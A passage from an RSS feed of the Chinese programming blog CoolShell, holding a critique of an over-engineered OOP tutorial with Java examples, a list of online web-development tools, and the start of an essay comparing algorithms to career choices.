<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0">
<channel>
<title>酷 壳 – CoolShell</title>
<description>享受编程和技术所带来的快乐 – Coding Your Ambition</description>
<link>https://coolshell.cn</link>
<pubDate>2021-11-26T11:34:01+08:00</pubDate>
<!-- other elements omitted from this example -->
<item>
<title><![CDATA[ 如此理解面向对象编程 ]]></title>
<link>https://coolshell.cn/articles/8745.html</link>
<content><![CDATA[ 
<p>从Rob Pike 的 Google+上的一个推看到了一篇叫《<a href="http://www.csis.pace.edu/~bergin/patterns/ppoop.html" target="_blank">Understanding Object Oriented Programming</a>》的文章，我先把这篇文章简述一下，然后再说说老牌黑客Rob Pike的评论。</p>
<p>先看这篇教程是怎么来讲述OOP的。它先给了下面这个问题，这个问题需要输出一段关于操作系统的文字：假设Unix很不错，Windows很差。</p>
<p>这个把下面这段代码描述成是<strong>Hacker Solution</strong>。（这帮人觉得下面这叫黑客？我估计这帮人真是没看过C语言的代码）</p>
<p></p>
<pre data-enlighter-language="java" class="EnlighterJSRAW">public class PrintOS
{
	public static void main(final String[] args)
	{
		String osName = System.getProperty("os.name") ;
		if (osName.equals("SunOS") || osName.equals("Linux"))
		{
			System.out.println("This is a UNIX box and therefore good.") ;
		}
		else if (osName.equals("Windows NT") || osName.equals("Windows 95"))
		{
			System.out.println("This is a Windows box and therefore bad.") ;
		}
		else
		{
			System.out.println("This is not a box.") ;
		}
	}
}</pre>
<p>然后开始用面向对象的编程方式一步一步地进化这个代码。</p>
<p>先是以过程化的思路来重构之。</p>
<p><span id="more-8745"></span></p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#%E8%BF%87%E7%A8%8B%E5%8C%96%E7%9A%84%E6%96%B9%E6%A1%88" title="过程化的方案">过程化的方案</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#%E5%B9%BC%E7%A8%9A%E7%9A%84%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B" title="幼稚的面向对象编程">幼稚的面向对象编程</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#OO%E5%A4%A7%E5%B8%88%E7%9A%84%E6%96%B9%E6%A1%88" title="OO大师的方案">OO大师的方案</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#Rob_Pike%E7%9A%84%E8%AF%84%E8%AE%BA" title="Rob Pike的评论">Rob Pike的评论</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-5" href="#%E6%88%91%E7%9A%84%E7%90%86%E8%A7%A3" title="我的理解">我的理解</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="%E8%BF%87%E7%A8%8B%E5%8C%96%E7%9A%84%E6%96%B9%E6%A1%88"></span>过程化的方案<span class="ez-toc-section-end"></span>
</h4>
<p></p>
<pre data-enlighter-language="java" class="EnlighterJSRAW">public class PrintOS
{
	private static String unixBox()
	{
		return "This is a UNIX box and therefore good." ;
	}
	private static String windowsBox()
  	{
		return "This is a Windows box and therefore bad." ;
	}
	private static String defaultBox()
	{
		return "This is not a box." ;
	}
	private static String getTheString(final String osName)
	{
		if (osName.equals("SunOS") || osName.equals("Linux"))
		{
			return unixBox() ;
		}
		else if (osName.equals("Windows NT") ||osName.equals("Windows 95"))
		{
			return windowsBox() ;
		}
		else
		{
			return defaultBox() ;
		}
  	}
	public static void main(final String[] args)
	{
		System.out.println(getTheString(System.getProperty("os.name"))) ;
	}
}</pre>
<p>然后是一个幼稚的面向对象的思路。</p>
<h4>
<span class="ez-toc-section" id="%E5%B9%BC%E7%A8%9A%E7%9A%84%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B"></span>幼稚的面向对象编程<span class="ez-toc-section-end"></span>
</h4>
<p></p>
<pre data-enlighter-language="java" class="EnlighterJSRAW">public class PrintOS
{
	public static void main(final String[] args)
  	{
		System.out.println(OSDiscriminator.getBoxSpecifier().getStatement()) ;
 	}
}</pre>
<p> </p>
<p></p>
<pre data-enlighter-language="java" class="EnlighterJSRAW">public class OSDiscriminator // Factory Pattern
{
	private static BoxSpecifier theBoxSpecifier = null ;
  	public static BoxSpecifier getBoxSpecifier()
	{
		if (theBoxSpecifier == null)
		{
			String osName = System.getProperty("os.name") ;
 			if (osName.equals("SunOS") || osName.equals("Linux"))
 			{
				theBoxSpecifier = new UNIXBox() ;
			}
			else if (osName.equals("Windows NT") || osName.equals("Windows 95"))
			{
				theBoxSpecifier = new WindowsBox() ;
			}
			else
			{
				theBoxSpecifier = new DefaultBox () ;
			}
		}
		return theBoxSpecifier ;
	}
}</pre>
<p> </p>
<p></p>
<pre data-enlighter-language="java" class="EnlighterJSRAW">public interface BoxSpecifier
{
	String getStatement() ;
}</pre>
<p> </p>
<p></p>
<pre data-enlighter-language="java" class="EnlighterJSRAW">public class DefaultBox implements BoxSpecifier
{
	public String getStatement()
	{
		return "This is not a box." ;
  	}
}</pre>
<p> </p>
<p></p>
<pre data-enlighter-language="java" class="EnlighterJSRAW">public class UNIXBox implements BoxSpecifier
{
	public String getStatement()
	{
		return "This is a UNIX box and therefore good." ;
  	}
}</pre>
<p> </p>
<p></p>
<pre data-enlighter-language="java" class="EnlighterJSRAW">public class WindowsBox implements BoxSpecifier
{
  	public String getStatement()
	{
		return "This is a Windows box and therefore bad." ;
	}
}</pre>
<p>他们觉得上面这段代码没有消除if语句，他们说这叫代码的“logic bottleneck”（逻辑瓶颈），因为如果你要增加一个操作系统的判断的话，你不但要加个类，还要改那段if-else的语句。</p>
<p>所以，他们整出一个叫Sophisticated的面向对象的解决方案。</p>
<h4>
<span class="ez-toc-section" id="OO%E5%A4%A7%E5%B8%88%E7%9A%84%E6%96%B9%E6%A1%88"></span>OO大师的方案<span class="ez-toc-section-end"></span>
</h4>
<p>注意其中的Design Pattern</p>
<p></p>
<pre data-enlighter-language="java" class="EnlighterJSRAW">public class PrintOS
{
  	public static void main(final String[] args)
  	{
		System.out.println(OSDiscriminator.getBoxSpecifier().getStatement()) ;
  	}
}</pre>
<br>
<pre data-enlighter-language="java" class="EnlighterJSRAW">public class OSDiscriminator // Factory Pattern
{
  	private static java.util.HashMap storage = new java.util.HashMap() ;

 	public static BoxSpecifier getBoxSpecifier()
	{
		BoxSpecifier value = (BoxSpecifier)storage.get(System.getProperty("os.name")) ;
		if (value == null)
			return DefaultBox.value ;
		return value ;
 	}
  	public static void register(final String key, final BoxSpecifier value)
  	{
		storage.put(key, value) ; // Should guard against null keys, actually.
  	}
  	static
  	{
		WindowsBox.register() ;
  		UNIXBox.register() ;
  		MacBox.register() ;
  	}
}</pre>
<br>
<pre data-enlighter-language="java" class="EnlighterJSRAW">public interface BoxSpecifier
{
  	String getStatement() ;
}</pre>
<br>
<pre data-enlighter-language="java" class="EnlighterJSRAW">public class DefaultBox implements BoxSpecifier // Singleton Pattern
{
	public static final DefaultBox value = new DefaultBox () ;
	private DefaultBox() { }
	public String getStatement()
	{
		return "This is not a box." ;
	}
}</pre>
<br>
<pre data-enlighter-language="java" class="EnlighterJSRAW">public class UNIXBox implements BoxSpecifier // Singleton Pattern
{
 	public static final UNIXBox value = new UNIXBox() ;
	private UNIXBox() { }
	public  String getStatement()
   	{
		return "This is a UNIX box and therefore good." ;
 	}
  	public static final void register()
  	{
		OSDiscriminator.register("SunOS", value) ;
  		OSDiscriminator.register("Linux", value) ;
 	}
}</pre>
<br>
<pre data-enlighter-language="java" class="EnlighterJSRAW">public class WindowsBox implements BoxSpecifier  // Singleton Pattern
{
	public  static final WindowsBox value = new WindowsBox() ;
	private WindowsBox() { }
	public String getStatement()
	{
		return "This is a Windows box and therefore bad." ;
  	}
  	public static final void register()
  	{
		OSDiscriminator.register("Windows NT", value) ;
  		OSDiscriminator.register("Windows 95", value) ;
	}
}</pre>
<br>
<pre data-enlighter-language="java" class="EnlighterJSRAW">public class MacBox implements BoxSpecifier // Singleton Pattern
{
 	public static final MacBox value = new MacBox() ;
	private MacBox() { }
	public  String getStatement()
   	{
		return "This is a Macintosh box and therefore far superior." ;
 	}
  	public static final void register()
  	{
		OSDiscriminator.register("Mac OS", value) ;
 	}
}</pre>
<p>作者还非常的意地说，他加了一个“Mac OS”的东西。<strong>老实说，当我看到最后这段OO大师搞出来的代码，我快要吐了</strong>。我瞬间想到了两件事：一个是以前酷壳上的《<a style="line-height: 13px;" title="面向对象是个骗局？！" href="https://coolshell.cn/articles/3036.html" target="_blank">面向对象是个骗局</a>》和 《<a style="line-height: 13px;" title="各种流行的编程风格" href="https://coolshell.cn/articles/2058.html" target="_blank">各种流行的编程方式</a>》中说的“设计模式驱动编程”，另一个我想到了那些被敏捷洗过脑的程序员和咨询师，也是这种德行。</p>
<p>于是我去看了一下第一作者<a href="http://csis.pace.edu/~bergin/" target="_blank">Joseph Bergin的主页</a>，这个Ph.D是果然刚刚完成了一本关于敏捷和模式的书。</p>
<h4>
<span class="ez-toc-section" id="Rob_Pike%E7%9A%84%E8%AF%84%E8%AE%BA"></span>Rob Pike的评论<span class="ez-toc-section-end"></span>
</h4>
<p>（Rob Pike是当年在Bell lab里和Ken一起搞Unix的主儿，后来和Ken开发了UTF-8，现在还和Ken一起搞Go语言。注：不要以为Ken和Dennis是基友，其实他们才是真正的老基友！）</p>
<p>Rob Pike在他的<a href="https://plus.google.com/101960720994009339267/posts/hoJdanihKwb" target="_blank">Google+的这贴</a>里评论到这篇文章——</p>
<p>他并不确认这篇文章是不是搞笑？但是他觉得这些个写这篇文章是很认真的。他说他要评论这篇文章是因为他们是一名Hacker，至少这个词出现在这篇文章的术语中。</p>
<p>他说，这个程序根本就不需要什么Object，只需要一张小小的配置表格，里面配置了对应的操作系统和你想输出的文本。这不就完了。这么简单的设计，非常容易地扩展，他们那个所谓的Hack Solution完全就是笨拙的代码。后面那些所谓的代码进化相当疯狂和愚蠢的，这个完全误导了对编程的认知。</p>
<p>然后，他还说，<strong>他觉得这些OO的狂热份子非常害怕数据，他们喜欢用多层的类的关系来完成一个本来只需要检索三行数据表的工作</strong>。他说他曾经听说有人在他的工作种用各种OO的东西来替换While循环。（我听说中国Thoughtworks那帮搞敏捷的人的确喜欢用Object来替换所有的if-else语句，他们甚至还喜欢把函数的行数限制在10行以内）</p>
<p>他还给了一个链接<a href="http://prog21.dadgum.com/156.html">http://prog21.dadgum.com/156.html</a>，你可以读一读。最后他说，<strong>OOP的本质就是——对数据和与之关联的行为进行编程</strong>。便就算是这样也不完全对，因为：</p>
<p style="text-align: center;"><strong>Sometimes data is just data and functions are just functions.</strong></p>
<h4>
<span class="ez-toc-section" id="%E6%88%91%E7%9A%84%E7%90%86%E8%A7%A3"></span>我的理解<span class="ez-toc-section-end"></span>
</h4>
<p>我觉得，这篇文章的例子举得太差了，差得感觉就像是OO的高级黑。面向对象编程注重的是：<strong>1）数据和其行为的打包封装，2）程序的接口和实现的解耦</strong>。你那怕，举一个多个开关和多个电器的例子，不然就像STL中，一个排序算法对多个不同容器的例子，都比这个例子要好得多得多。老实说，Java SDK里太多这样的东西了。</p>
<p>我以前给一些公司讲一些设计模式的培训课，我一再提到，<strong>那23个经典的设计模式和OO半毛钱关系没有</strong>，只不过人家用OO来实现罢了。<strong>设计模式就三个准则：1）中意于组合而不是继承，2）依赖于接口而不是实现，3）高内聚，低耦合。你看，这完全就是Unix的设计准则</strong>。</p>
<p>（全文完）</p>
<div style="margin-top: 15px; font-size: 11px;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
 ]]></content>
<pubDate>2012-12-13T08:19:28+08:00</pubDate>
<guid>https://coolshell.cn/articles/8745.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ Web工程师的工具箱 ]]></title>
<link>https://coolshell.cn/articles/8767.html</link>
<content><![CDATA[ 
<p><img alt="image placeholder" >本文出自<a href="http://ivanzuzak.info/" target="_blank">Ivan Zuzak</a> 的《<a href="http://ivanzuzak.info/2012/11/18/the-web-engineers-online-toolbox.html" target="_blank">The Web engineer’s online toolbox</a>》，作者给了一个各种可以用来进行开发、测试、调试以及文档编排的在线工具集。（注：我发现CSDN上已经有了这篇文章《<a href="http://www.csdn.net/article/2012-11-19/2811992" target="_blank">Web工程师必备的18款工具</a>》，但可惜的是这篇文章并不全（原文后来被更新到了33个工具），而且其中并没有包括原文评论中出现的所有工具，所以，我一并补全了更出来，一共40多个工具）</p>
<h4><strong>Web工程师在线工具箱</strong></h4>
<ul>
<li>
<a href="https://requestb.in/" target="_blank"><strong>RequestBin</strong></a><strong>：</strong>允许你创建一个URL，利用这款工具进行收集请求，然后通过个性化方式进行检查。</li>
</ul>
<ul>
<li>
<a href="https://www.hurl.it/" target="_blank"><strong>Hurl</strong></a><strong>：</strong>发出HTTP请求，输入URL，设置标题，查看响应，最后分享给其他人。类似的工具有：<a href="http://resttesttest.com/" target="_blank">REST test test</a>, <a href="https://apigee.com/console/others" target="_blank">Apigee console</a>.。</li>
</ul>
<ul>
<li>
<a href="https://httpbin.org/" target="_blank"><strong>Httpbin</strong></a><strong>：</strong>HTTP请求&amp;响应服务，涵盖所有的HTTP方案（例如不同的HTTP verbs、状态代码和重定向）。类似工具：<a href="http://ivanzuzak.info/urlecho/">UrlEcho</a>。</li>
</ul>
<ul>
<li>
<a href="http://redbot.org/" target="_blank"><strong>REDbot</strong></a><strong>：</strong>这是一个机器人工具，帮助用户检查HTTP资源，可查看它的操作情况，指出常见的问题并提出改进。类似工具：<a href="http://zamez.org/httplint">HTTP lint</a>。</li>
</ul>
<ul>
<li>
<a href="http://webgun.io/" target="_blank"><strong>WebGun</strong></a><strong>：</strong>用于创建webhooks模板的API。类似工具：<a href="https://github.com/izuzak/urlreq">UrlReq</a>。</li>
</ul>
<ul>
<li>
<strong><a href="https://www.webscript.io/">Webscript</a> </strong> 自选一个url，填一段Lua代码，就能对访问做各种respond，还可以主动运行任务，cron job等等…</li>
</ul>
<p><span id="more-8767"></span></p>
<ul>
<li>
<strong><a href="http://www.clickhooks.com/">ClickHooks</a> </strong>这是一个短网址服务， 当用户访问了你的这个短网址跳转链接，服务器会通过HTTP POST的方式回调你的一个URL。这也是一种WebHooks方式。（陈皓注：所谓WebHooks，你可以理解为一种trigger，或是一种handler，比如当你你提交了代码，会调用某个URL链接以POST的方式告诉那个网站你提交了代码（如：发一个twitter 之类的，或是通知某个bug tracker系统））</li>
</ul>
<ul>
<li>
<strong><a href="https://mailhooks2.appspot.com/">MailHooks</a> </strong>让你可以通过HTTP POST方法收电子邮件（又叫WebHooks），你可以为你的一个邮件地址创建N多的hooks，当一个邮件收到了，可以把这个邮件以POST的方式发到你的某个URL上去。</li>
</ul>
<ul>
<li>
<strong><a href="http://a.quil.la/">Quilla</a> </strong>提供一个人们可以找到你的短网站服务，在那里，当人们提交到你的短网址上的请求会给你发邮件。好像是一种HTTP到SMTP的代理服务。</li>
</ul>
<ul>
<li>
<a href="https://apify.heroku.com/resources" target="_blank"><strong>Apify</strong></a><strong>：</strong>公开锁定在HTML文档没有任何API数据集。APIfy从结构标记中提取数据，并将其转换为JSON APIs。</li>
</ul>
<ul>
<li>
<a href="https://validator.w3.org/unicorn/" target="_blank"><strong>Unicorn</strong></a><strong>：</strong>W3C统一的验证程序，可在各种流行的HTML和CSS验证器中执行各种检查。类似工具：<a href="http://lint.brihten.com/html/">HTML lint</a>。</li>
</ul>
<ul>
<li>
<strong><a href="http://jsonlint.com/">JSONLint</a> </strong>JSON 格式验证程序</li>
</ul>
<ul>
<li>
<a href="https://validator.w3.org/feed/" target="_blank"><strong>Feed validator</strong></a><strong>：</strong>支持W3C验证，为RSS和ATOM提供阅读源。</li>
</ul>
<ul>
<li>
<a href="https://validator.w3.org/checklink" target="_blank"><strong>Link checker</strong></a><strong>：</strong>从网站中提取链接（递归）并确保没有链接被定义为两次（重复定义），所有的链接被引用并警告HTTP重新定向。</li>
</ul>
<ul>
<li>
<a href="https://www.host-tracker.com/" target="_blank"><strong>Host tracker</strong></a><strong>：</strong>通过分布式ping/跟踪检查、定期监测、邮件/SMS /IM通知和统计进行网站检测性服务。类似工具有：<a href="https://downforeveryoneorjustme.com/">Down for everyone or just me</a>, <a href="https://tools.pingdom.com/ping/">Pimgdom ping service</a>
</li>
</ul>
<ul>
<li>
<strong><a href="http://www.viewdns.info/">ViewDNS</a> </strong>一组 DNS 和网络工具，如：反向IP解析，DNS记录查询或traceroute之类的。</li>
</ul>
<ul>
<li>
<strong><a href="http://www.necrohost.com/">Necrohost</a>  </strong>一个URL列表来模拟不同网络链接的问题，如：响应慢，无法解析DNS，或是404什么的。</li>
</ul>
<ul>
<li>
<strong><a href="https://code.google.com/p/mirrorrr/">Mirrorrr</a>  </strong>一个可以用来镜像某网页的应用（经常被国人用来搞Web 代理来翻墙）。</li>
</ul>
<ul>
<li>
<strong><a href="http://certlogik.com/ssl-checker/">SSL Checker</a>  </strong>测试SSL认证</li>
</ul>
<ul>
<li>
<strong><a href="http://certlogik.com/decoder/">CSR/Cert decoder</a>  </strong>对你的CSR和SSL认证decode检查。</li>
</ul>
<ul>
<li>
<strong><a href="http://loadzen.com/">Loadzen</a>  </strong>Web压力测试工具（注：以前酷壳介绍过《<a href="https://coolshell.cn/articles/2589.html" target="_blank">十个Web压力测试工具</a>》）</li>
</ul>
<ul>
<li>
<a href="https://tools.pingdom.com/fpt/" target="_blank"><strong>Pingdom Full page test</strong></a><strong>：</strong>允许用户测试网页记载时间、分析、监控，发现瓶颈并导出HAR格式的结果。类似工具：<a href="http://www.webpagetest.org/">Web page test</a>。</li>
</ul>
<ul>
<li>
<strong><a href="https://developers.google.com/speed/pagespeed/insights">Google PageSpeed Insights</a> </strong>Analyzes the content of a web page, then generates suggestions to make that page faster.</li>
</ul>
<ul>
<li>
<a href="http://www.softwareishard.com/har/viewer/" target="_blank"><strong>HAR viewer</strong></a><strong>：</strong>通过 HTTP 追踪工具创建可视化的HTTP Archive (HAR)日志文件。</li>
</ul>
<ul>
<li>
<a href="http://www.corsproxy.com/" target="_blank"><strong>CORS proxy</strong></a><strong>：</strong>通常会由于相同的域而被阻止，而这款工具在网站上允许JavaScript代码访问其他域上的资源，</li>
</ul>
<ul>
<li>
<a href="https://browserling.com/" target="_blank"><strong>Browserling</strong></a><strong>：</strong>支持使用所有主要浏览器以及各种版本进行交互式跨浏览器测试。</li>
</ul>
<ul>
<li>
<a href="https://www.websocket.org/echo.html" target="_blank"><strong>WebSocket Echo Test</strong></a><strong>:</strong> 从浏览器定向到WebSocket echo服务器进行WebSocket连接测试。</li>
</ul>
<ul>
<li>
<a href="https://developer.yahoo.com/yql/" target="_blank"><strong>YQL</strong></a><strong>：</strong>极富表现力类似于SQL的语言，允许您查询、筛选和联接数据跨Web服务。</li>
</ul>
<ul>
<li>
<strong><a href="http://webshell.io/">Webshell</a> </strong>使用命令行脚本的方式来调用一些Web API。</li>
</ul>
<ul>
<li>
<a href="https://pipes.yahoo.com/pipes/" target="_blank"><strong>Yahoo Pipes</strong></a><strong>：</strong>一个图形化的用户界面，用于创建数据混搭，生成聚合Web源，Web页面和其他服务。</li>
</ul>
<ul>
<li>
<a href="https://apiary.io/" target="_blank"><strong>Apiary</strong></a><strong>：</strong>语言和工具用于生成REST API文档及进行交互式督查。类似工具：<a href="http://swagger.wordnik.com/">Swagger</a>。</li>
</ul>
<ul>
<li>
<strong><a href="https://jsfiddle.net/">JSFiddle</a>  </strong>一个在线的代码编辑可以让你编译一些HTML, CSS 和 JavaScript的东西，并演示之。相似工具: <a href="http://jsbin.com/">JSBin</a>
</li>
</ul>
<ul>
<li>
<a href="https://developers.google.com/feed/v1/jsondevguide">Google Feed API</a> 你可以使用这个API来查询有RSS Feed的网站 (<a href="https://ajax.googleapis.com/ajax/services/feed/lookup?v=1.0&amp;q=http://ivanzuzak.info/">example</a>)，或是搜索有RSS Feed(<a href="https://ajax.googleapis.com/ajax/services/feed/find?v=1.0&amp;q=ivan%20zuzak">example</a>) ，或是把JSON变成一个JSON返回 (<a href="https://ajax.googleapis.com/ajax/services/feed/load?v=1.0&amp;q=http://ivanzuzak.info/atom.xml">example</a>)</li>
</ul>
<h4>未在列表的工具</h4>
<ul>
<li>
<a href="https://www.fiddler2.com/fiddler2/">Fiddler</a> — 可能是最强大最好用的Web调试工具之一，它能记录所有客户端和服务器的http和https请求，允许你监视，设置断点，甚至修改输入输出数据. 使用Fiddler无论对开发还是测试来说，都有很大的帮助。.</li>
</ul>
<ul>
<li>
<a href="https://grids.heroku.com/">960 grid system generator</a> 和 <a href="http://meyerweb.com/eric/tools/css/reset/">CSS reset</a> — 两个关注于Web站点设计的工具。</li>
</ul>
<ul>
<li>
<a href="http://www.nuvolabase.com/site/index.html">NuvolaBase</a> — 一个可以共享个人私有数据的解决方案。正如作者所说，这不是一个开发工具。</li>
</ul>
<ul>
<li>
<a href="https://openexchangerates.org/">Open exchange rates</a> — 一个和汇率货币相关的JSON式的API。这样的API你可以到 <a href="http://www.programmableweb.com/">Programmable Web</a> 上查找。</li>
</ul>
<ul>
<li>
<a href="https://workflowy.com/">Workflowy</a>, <a href="http://www.lastcalc.com/">LastCalc</a>, <a href="http://codepad.org/">Codepad</a>, <a href="https://www.mailinator.com/">Mailinator</a> and <a href="https://10minutemail.com/">10MinuteMail</a>, <a href="https://onetimesecret.com/">One time secret</a> and <a href="http://copypastecharacter.com/">CopyPasteCharacter</a> — 这些App似乎和Web开发没什么关系。</li>
</ul>
<ul>
<li>
<a href="https://browsershots.org/">Browsershots</a> — 一个用来测试网页在不同平台下的工具。（参看）</li>
</ul>
<ul>
<li>
<a href="http://scriptular.com/">Scriptular</a> and <a href="http://rubular.com/">Rubular</a> — 正则表达式工具，这样的工具太多了，如： <a href="http://refiddle.com/">ReFiddle</a>, <a href="http://regexpal.com/">Regex pal</a> and <a href="http://www.txt2re.com/">Txt2Re</a>。</li>
</ul>
<p>（全文完）</p>
<div style="margin-top: 15px; font-size: 11px;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
 ]]></content>
<pubDate>2012-12-19T00:04:43+08:00</pubDate>
<guid>https://coolshell.cn/articles/8767.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 程序算法与人生选择 ]]></title>
<link>https://coolshell.cn/articles/8790.html</link>
<content><![CDATA[ 
<p><img alt="image placeholder" >每年一到要找工作的时候，我就能收到很多人给我发来的邮件，总是问我怎么选择他们的offer，去腾讯还是去豆瓣，去外企还是去国内的企业，去创业还是去考研，来北京还是回老家，该不该去创新工场？该不该去thoughtworks？……等等，等等。今年从7月份到现在，我收到并回复了60多封这样的邮件。我更多帮他们整理思路，帮他们明白自己最想要的是什么。（注：我以后不再回复类似的邮件了）。</p>
<p>我深深地发现，对于我国这样从小被父母和老师安排各种事情长大的人，当有一天，父母和老师都跟不上的时候，我们几乎完全不知道怎么去做选择。而我最近也离开了亚马逊，换了一个工作。又正值年底，就像去年的那篇《<a title="三个事和三个问题" href="https://coolshell.cn/articles/6142.html" target="_blank">三个故事和三个问题</a>》一样，让我想到写一篇这样的文章。</p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#%E5%87%A0%E4%B8%AA%E4%BE%8B%E5%AD%90" title="几个例子">几个例子</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95" title="排序算法">排序算法</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#%E8%B4%AA%E5%A9%AA%E7%AE%97%E6%B3%95" title="贪婪算法">贪婪算法</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92" title="动态规划">动态规划</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-5" href="#Dijkstra%E6%9C%80%E7%9F%AD%E8%B7%AF%E5%BE%84" title="Dijkstra最短路径">Dijkstra最短路径</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-6" href="#%E7%AE%97%E6%B3%95%E5%B0%B1%E6%98%AFTrade-Off" title="算法就是Trade-Off">算法就是Trade-Off</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="%E5%87%A0%E4%B8%AA%E4%BE%8B%E5%AD%90"></span>几个例子<span class="ez-toc-section-end"></span>
</h4>
<p>当我们在面对各种对选择的影响因子的时候，如：城市，公司规模，公司性质，薪水，项目，户口，技术，方向，眼界…… 你总会发现，你会在几个公司中纠结一些东西，举几个例子：</p>
<ul>
<li>某网友和我说，他们去上海腾讯，因为腾讯的规模很大，但却发现薪水待遇没有豆瓣高（低的还不是一点），如果以后要换工作的话，起薪点直接关系到了以后的高工资。我说那就去豆瓣吧，他说豆瓣在北京，污染那么严重，又没有户口，生存环境不好。我说去腾讯吧，他说腾讯最近组织调整，不稳定。我说那就去豆瓣吧，慢公司，发展很稳当。他说，豆瓣的盈利不清楚，而且用Python，自己不喜欢。我说，那就去腾讯吧，……</li>
</ul>
<ul>
<li>还有一网友和我说，他想回老家，因为老家的人脉关系比较好，能混得好。但又想留在大城市，因为大城市可以开眼界。</li>
</ul>
<p><span id="more-8790"></span></p>
<ul>
<li>另一网友和我说，他想进外企，练练英语，开开眼界，但是又怕在外企里当个螺丝钉，想法得不到实施。朋友拉他去创业，觉得创业挺好的，锻炼大，但是朋友做的那个不知道能不能做好。</li>
</ul>
<ul>
<li>还有一网友在创新工场的某团队和考研之间抉择，不知道去创新工场行不行，觉得那个项目一般，但是感觉那个团队挺有激情的，另一方面觉得自己的学历还不够，读个研应该能找到更好的工作。</li>
</ul>
<ul>
<li>还有一些朋友问题我应该学什么技术？不应该学什么技术？或是怎么学会学得最快，技术的路径应该是什么？有的说只做后端不做前端，有的说，只做算法研究，不做工程，等等，等等。因为他们觉得人生有限，术业有专攻。</li>
</ul>
<ul>
<li>等等，等等……</li>
</ul>
<p>我个人觉得，如果是非计算机科班出生的人不会做选择，不知道怎么走也罢了，但是我们计算机科班出生的人是学过算法的，<strong>懂算法的人应该是知道怎么做选择的</strong>。</p>
<h4></h4>
<h4>
<span class="ez-toc-section" id="%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95"></span>排序算法<span class="ez-toc-section-end"></span>
</h4>
<p>你不可能要所有的东西，所以你只能要你最重要的东西，你要知道什么东西最重要，你就需要对你心内的那些欲望和抱负有清楚的认识，不然，你就会在纠结中度过。</p>
<p>所以，在选择中纠结的人有必要参考一下排序算法。</p>
<ul>
<li>首先，你最需要参考的就是“冒泡排序”——这种算法的思路就是每次冒泡出一个最大的数。所以，你有必要问问你自己，面对那些影响你选择的因子，如果你只能要一个的话，你会要哪个？而剩下的都可以放弃。于是，当你把最大的数，一个一个冒泡出来的时候，并用这个决策因子来过滤选项的时候，你就能比较容易地知道知道你应该选什么了。<strong>这个算法告诉我们，人的杂念越少，就越容易做出选择。</strong>
</li>
</ul>
<ul>
<li>好吧，可能你已茫然到了怎么比较两个决策因子的大小，比如：你分不清楚，工资&gt;业务前景吗？业务前景&gt;能力提升吗？所以你完全没有办法进行冒泡法。那你，你不妨参考一个“快速排序”的思路——这个算法告诉我们，我们一开始并不需要找到最大的数，我们只需要把你价值观中的某个标准拿出来，然后，把可以满足这个价值的放到右边，不能的放到左边去。比如，你的标准是：工资大于5000元&amp;&amp;业务前景长于3年的公司，你可以用这个标准来过滤你的选项。然后，你可以再调整这个标准再继续递归下去。<strong>这个算法告诉我们，我们的选择标准越清晰，我们就越容易做出选择</strong>。</li>
</ul>
<p>这是排序算法中最经典的两个算法了，面试必考。相信你已烂熟于心中了。所以，我觉得你把这个算法应用于你的人生选择也应该不是什么问题。关于在于，你是否知道自己想要的是什么？</p>
<p>排序算法的核心思想就是，<strong>让你帮助你认清自己最需要的是什么，认清自己最想要的是什么，然后根据这个去做选择</strong>。</p>
<h4>
<span class="ez-toc-section" id="%E8%B4%AA%E5%A9%AA%E7%AE%97%E6%B3%95"></span>贪婪算法<span class="ez-toc-section-end"></span>
</h4>
<p>所谓贪婪算法，是一种在每一步选择中都采取在当前状态下最好或最优（即最有利）的选择（注意：是当前状态下），从而希望导致结果是最好或最优的算法。贪婪算法最经典的一个例子就是<a title="Huffman 编码压缩算法" href="https://coolshell.cn/articles/7459.html" target="_blank">哈夫曼编码</a>。</p>
<p>对于人类来说，一般人在行为处事的时候都会使用到贪婪算法，</p>
<ul>
<li>比如在找零钱的时候，如果要找补36元，我们一般会按这样的顺序找钱：20元，10元，5元，1元。</li>
</ul>
